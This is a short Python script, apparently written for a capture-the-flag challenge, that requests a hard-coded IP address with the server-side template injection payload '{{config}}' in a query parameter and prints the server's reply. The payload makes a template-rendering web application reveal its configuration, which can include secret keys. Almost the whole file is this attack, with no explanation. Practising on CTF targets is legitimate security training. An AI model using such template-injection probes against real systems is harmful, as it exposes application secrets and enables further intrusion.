from pprint import pprint

import requests
import re
import parser

headers = {
    'User-Agent': 'Mozia/5.0 (Macintosh; Inte Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0'
}

home_ur = requests.get('http://114.67.246.176:11639/?flag={{config}}', headers=headers)
htm = home_ur.text
print(htm)

